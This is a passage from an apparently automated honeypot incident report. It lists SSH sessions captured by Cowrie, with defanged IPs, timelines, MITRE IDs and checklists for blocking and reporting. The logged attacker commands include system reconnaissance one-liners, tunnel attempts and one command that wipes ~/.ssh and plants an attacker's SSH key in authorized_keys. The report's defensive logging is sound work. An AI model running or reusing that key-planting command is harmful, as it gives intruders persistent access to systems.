| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:31:57` | `cowrie.session.connect` |
| `2026-07-24 04:31:57` | `cowrie.client.version` |
| `2026-07-24 04:31:57` | `cowrie.client.kex` |
| `2026-07-24 04:32:00` | `cowrie.login.success` |
| `2026-07-24 04:32:00` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:32:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.115[.]152` to AbuseIPDB if not already reported
- [ ] Block `112.120.115[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a2f106221d1

| Field | Detail |
|---|---|
| **Source IP** | `124.167.20[.]72` |
| **First Seen** | 2026-07-24 04:32 |
| **Last Seen** | 2026-07-24 04:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:32:07` | `cowrie.session.connect` |
| `2026-07-24 04:32:08` | `cowrie.client.version` |
| `2026-07-24 04:32:08` | `cowrie.client.kex` |
| `2026-07-24 04:32:09` | `cowrie.login.success` |
| `2026-07-24 04:32:10` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:32:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.167.20[.]72` to AbuseIPDB if not already reported
- [ ] Block `124.167.20[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c1cc1eaa2a8

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:33 |
| **Last Seen** | 2026-07-24 04:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:33:16` | `cowrie.session.connect` |
| `2026-07-24 04:33:16` | `cowrie.client.version` |
| `2026-07-24 04:33:16` | `cowrie.client.kex` |
| `2026-07-24 04:33:17` | `cowrie.login.success` |
| `2026-07-24 04:33:17` | `cowrie.session.params` |
| `2026-07-24 04:33:17` | `cowrie.command.input` |
| `2026-07-24 04:33:17` | `cowrie.log.closed` |
| `2026-07-24 04:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0971cd09c35b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 04:34 |
| **Last Seen** | 2026-07-24 04:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:34:04` | `cowrie.session.connect` |
| `2026-07-24 04:34:05` | `cowrie.client.version` |
| `2026-07-24 04:34:05` | `cowrie.client.kex` |
| `2026-07-24 04:34:08` | `cowrie.login.success` |
| `2026-07-24 04:34:10` | `cowrie.session.params` |
| `2026-07-24 04:34:10` | `cowrie.command.input` |
| `2026-07-24 04:34:10` | `cowrie.command.input` |
| `2026-07-24 04:34:10` | `cowrie.command.input` |
| `2026-07-24 04:34:10` | `cowrie.command.input` |
| `2026-07-24 04:34:10` | `cowrie.command.input` |
| `2026-07-24 04:34:10` | `cowrie.command.success` |
| `2026-07-24 04:34:10` | `cowrie.command.input` |
| `2026-07-24 04:34:10` | `cowrie.command.input` |
| `2026-07-24 04:34:10` | `cowrie.command.input` |
| `2026-07-24 04:34:10` | `cowrie.command.input` |
| `2026-07-24 04:34:11` | `cowrie.log.closed` |
| `2026-07-24 04:34:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72dcc15dde16

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:35 |
| **Last Seen** | 2026-07-24 04:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:35:03` | `cowrie.session.connect` |
| `2026-07-24 04:35:03` | `cowrie.client.version` |
| `2026-07-24 04:35:03` | `cowrie.client.kex` |
| `2026-07-24 04:35:03` | `cowrie.login.success` |
| `2026-07-24 04:35:04` | `cowrie.session.params` |
| `2026-07-24 04:35:04` | `cowrie.command.input` |
| `2026-07-24 04:35:04` | `cowrie.log.closed` |
| `2026-07-24 04:35:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb93bf70f41c

| Field | Detail |
|---|---|
| **Source IP** | `176.172.239[.]193` |
| **First Seen** | 2026-07-24 04:35 |
| **Last Seen** | 2026-07-24 04:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:35:15` | `cowrie.session.connect` |
| `2026-07-24 04:35:16` | `cowrie.client.version` |
| `2026-07-24 04:35:16` | `cowrie.client.kex` |
| `2026-07-24 04:35:16` | `cowrie.login.success` |
| `2026-07-24 04:35:16` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:35:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.172.239[.]193` to AbuseIPDB if not already reported
- [ ] Block `176.172.239[.]193` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52579ff775b2

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:36 |
| **Last Seen** | 2026-07-24 04:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:36:46` | `cowrie.session.connect` |
| `2026-07-24 04:36:46` | `cowrie.client.version` |
| `2026-07-24 04:36:46` | `cowrie.client.kex` |
| `2026-07-24 04:36:47` | `cowrie.login.success` |
| `2026-07-24 04:36:48` | `cowrie.session.params` |
| `2026-07-24 04:36:48` | `cowrie.command.input` |
| `2026-07-24 04:36:48` | `cowrie.log.closed` |
| `2026-07-24 04:36:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bba1a56e270

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:38 |
| **Last Seen** | 2026-07-24 04:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:38:29` | `cowrie.session.connect` |
| `2026-07-24 04:38:29` | `cowrie.client.version` |
| `2026-07-24 04:38:29` | `cowrie.client.kex` |
| `2026-07-24 04:38:30` | `cowrie.login.success` |
| `2026-07-24 04:38:30` | `cowrie.session.params` |
| `2026-07-24 04:38:30` | `cowrie.command.input` |
| `2026-07-24 04:38:31` | `cowrie.log.closed` |
| `2026-07-24 04:38:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c91195ac465

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 04:38 |
| **Last Seen** | 2026-07-24 04:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:38:40` | `cowrie.session.connect` |
| `2026-07-24 04:38:41` | `cowrie.client.version` |
| `2026-07-24 04:38:41` | `cowrie.client.kex` |
| `2026-07-24 04:38:44` | `cowrie.login.success` |
| `2026-07-24 04:38:46` | `cowrie.session.params` |
| `2026-07-24 04:38:46` | `cowrie.command.input` |
| `2026-07-24 04:38:46` | `cowrie.command.input` |
| `2026-07-24 04:38:46` | `cowrie.command.input` |
| `2026-07-24 04:38:46` | `cowrie.command.input` |
| `2026-07-24 04:38:46` | `cowrie.command.input` |
| `2026-07-24 04:38:46` | `cowrie.command.success` |
| `2026-07-24 04:38:46` | `cowrie.command.input` |
| `2026-07-24 04:38:46` | `cowrie.command.input` |
| `2026-07-24 04:38:46` | `cowrie.command.input` |
| `2026-07-24 04:38:46` | `cowrie.command.input` |
| `2026-07-24 04:38:46` | `cowrie.log.closed` |
| `2026-07-24 04:38:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e882ba0570ad

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:40 |
| **Last Seen** | 2026-07-24 04:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:40:13` | `cowrie.session.connect` |
| `2026-07-24 04:40:13` | `cowrie.client.version` |
| `2026-07-24 04:40:13` | `cowrie.client.kex` |
| `2026-07-24 04:40:13` | `cowrie.login.success` |
| `2026-07-24 04:40:14` | `cowrie.session.params` |
| `2026-07-24 04:40:14` | `cowrie.command.input` |
| `2026-07-24 04:40:14` | `cowrie.log.closed` |
| `2026-07-24 04:40:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d589f5f0752

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 04:41 |
| **Last Seen** | 2026-07-24 04:41 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:41:12` | `cowrie.session.connect` |
| `2026-07-24 04:41:13` | `cowrie.client.version` |
| `2026-07-24 04:41:13` | `cowrie.client.kex` |
| `2026-07-24 04:41:16` | `cowrie.login.success` |
| `2026-07-24 04:41:18` | `cowrie.session.params` |
| `2026-07-24 04:41:18` | `cowrie.command.input` |
| `2026-07-24 04:41:18` | `cowrie.command.input` |
| `2026-07-24 04:41:18` | `cowrie.command.input` |
| `2026-07-24 04:41:18` | `cowrie.command.input` |
| `2026-07-24 04:41:18` | `cowrie.command.input` |
| `2026-07-24 04:41:18` | `cowrie.command.success` |
| `2026-07-24 04:41:18` | `cowrie.command.input` |
| `2026-07-24 04:41:18` | `cowrie.command.input` |
| `2026-07-24 04:41:18` | `cowrie.command.input` |
| `2026-07-24 04:41:18` | `cowrie.command.input` |
| `2026-07-24 04:41:19` | `cowrie.log.closed` |
| `2026-07-24 04:41:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1ee0484c124

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:41 |
| **Last Seen** | 2026-07-24 04:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:41:52` | `cowrie.session.connect` |
| `2026-07-24 04:41:52` | `cowrie.client.version` |
| `2026-07-24 04:41:53` | `cowrie.client.kex` |
| `2026-07-24 04:41:53` | `cowrie.login.success` |
| `2026-07-24 04:41:53` | `cowrie.session.params` |
| `2026-07-24 04:41:53` | `cowrie.command.input` |
| `2026-07-24 04:41:54` | `cowrie.log.closed` |
| `2026-07-24 04:41:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e696fec07399

| Field | Detail |
|---|---|
| **Source IP** | `119.207.3[.]114` |
| **First Seen** | 2026-07-24 04:42 |
| **Last Seen** | 2026-07-24 04:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:42:42` | `cowrie.session.connect` |
| `2026-07-24 04:42:43` | `cowrie.client.version` |
| `2026-07-24 04:42:43` | `cowrie.client.kex` |
| `2026-07-24 04:42:45` | `cowrie.login.success` |
| `2026-07-24 04:42:46` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:42:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.207.3[.]114` to AbuseIPDB if not already reported
- [ ] Block `119.207.3[.]114` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97289d2d0b81

| Field | Detail |
|---|---|
| **Source IP** | `114.98.63[.]18` |
| **First Seen** | 2026-07-24 04:42 |
| **Last Seen** | 2026-07-24 04:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:42:52` | `cowrie.session.connect` |
| `2026-07-24 04:42:53` | `cowrie.client.version` |
| `2026-07-24 04:42:53` | `cowrie.client.kex` |
| `2026-07-24 04:42:55` | `cowrie.login.success` |
| `2026-07-24 04:42:57` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:43:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.63[.]18` to AbuseIPDB if not already reported
- [ ] Block `114.98.63[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-941602ab7ceb

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:43 |
| **Last Seen** | 2026-07-24 04:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:43:29` | `cowrie.session.connect` |
| `2026-07-24 04:43:29` | `cowrie.client.version` |
| `2026-07-24 04:43:29` | `cowrie.client.kex` |
| `2026-07-24 04:43:29` | `cowrie.login.success` |
| `2026-07-24 04:43:30` | `cowrie.session.params` |
| `2026-07-24 04:43:30` | `cowrie.command.input` |
| `2026-07-24 04:43:30` | `cowrie.log.closed` |
| `2026-07-24 04:43:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c9f92934657

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 04:43 |
| **Last Seen** | 2026-07-24 04:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:43:36` | `cowrie.session.connect` |
| `2026-07-24 04:43:37` | `cowrie.client.version` |
| `2026-07-24 04:43:37` | `cowrie.client.kex` |
| `2026-07-24 04:43:39` | `cowrie.login.success` |
| `2026-07-24 04:43:41` | `cowrie.session.params` |
| `2026-07-24 04:43:41` | `cowrie.command.input` |
| `2026-07-24 04:43:41` | `cowrie.command.input` |
| `2026-07-24 04:43:41` | `cowrie.command.input` |
| `2026-07-24 04:43:41` | `cowrie.command.input` |
| `2026-07-24 04:43:41` | `cowrie.command.input` |
| `2026-07-24 04:43:41` | `cowrie.command.success` |
| `2026-07-24 04:43:41` | `cowrie.command.input` |
| `2026-07-24 04:43:41` | `cowrie.command.input` |
| `2026-07-24 04:43:41` | `cowrie.command.input` |
| `2026-07-24 04:43:41` | `cowrie.command.input` |
| `2026-07-24 04:43:42` | `cowrie.log.closed` |
| `2026-07-24 04:43:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c41805d9fe15

| Field | Detail |
|---|---|
| **Source IP** | `31.41.84[.]98` |
| **First Seen** | 2026-07-24 04:44 |
| **Last Seen** | 2026-07-24 04:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:44:19` | `cowrie.session.connect` |
| `2026-07-24 04:44:19` | `cowrie.client.version` |
| `2026-07-24 04:44:19` | `cowrie.client.kex` |
| `2026-07-24 04:44:20` | `cowrie.login.success` |
| `2026-07-24 04:44:20` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:44:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.41.84[.]98` to AbuseIPDB if not already reported
- [ ] Block `31.41.84[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46b7d109b5d9

| Field | Detail |
|---|---|
| **Source IP** | `211.43.139[.]142` |
| **First Seen** | 2026-07-24 04:44 |
| **Last Seen** | 2026-07-24 04:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:44:26` | `cowrie.session.connect` |
| `2026-07-24 04:44:26` | `cowrie.client.version` |
| `2026-07-24 04:44:26` | `cowrie.client.kex` |
| `2026-07-24 04:44:28` | `cowrie.login.success` |
| `2026-07-24 04:44:29` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:44:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.43.139[.]142` to AbuseIPDB if not already reported
- [ ] Block `211.43.139[.]142` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaba27a13f35

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:45 |
| **Last Seen** | 2026-07-24 04:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:45:08` | `cowrie.session.connect` |
| `2026-07-24 04:45:08` | `cowrie.client.version` |
| `2026-07-24 04:45:08` | `cowrie.client.kex` |
| `2026-07-24 04:45:09` | `cowrie.login.success` |
| `2026-07-24 04:45:09` | `cowrie.session.params` |
| `2026-07-24 04:45:09` | `cowrie.command.input` |
| `2026-07-24 04:45:09` | `cowrie.log.closed` |
| `2026-07-24 04:45:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9533177b2fd3

| Field | Detail |
|---|---|
| **Source IP** | `45.192.198[.]32` |
| **First Seen** | 2026-07-24 04:45 |
| **Last Seen** | 2026-07-24 04:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:45:54` | `cowrie.session.connect` |
| `2026-07-24 04:45:54` | `cowrie.client.version` |
| `2026-07-24 04:45:54` | `cowrie.client.kex` |
| `2026-07-24 04:45:55` | `cowrie.login.success` |
| `2026-07-24 04:45:56` | `cowrie.session.params` |
| `2026-07-24 04:45:56` | `cowrie.command.input` |
| `2026-07-24 04:45:56` | `cowrie.command.failed` |
| `2026-07-24 04:45:57` | `cowrie.log.closed` |
| `2026-07-24 04:45:58` | `cowrie.session.params` |
| `2026-07-24 04:45:58` | `cowrie.command.input` |
| `2026-07-24 04:45:58` | `cowrie.session.file_download` |
| `2026-07-24 04:45:58` | `cowrie.log.closed` |
| `2026-07-24 04:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.192.198[.]32` to AbuseIPDB if not already reported
- [ ] Block `45.192.198[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-160025043594

| Field | Detail |
|---|---|
| **Source IP** | `45.192.198[.]32` |
| **First Seen** | 2026-07-24 04:45 |
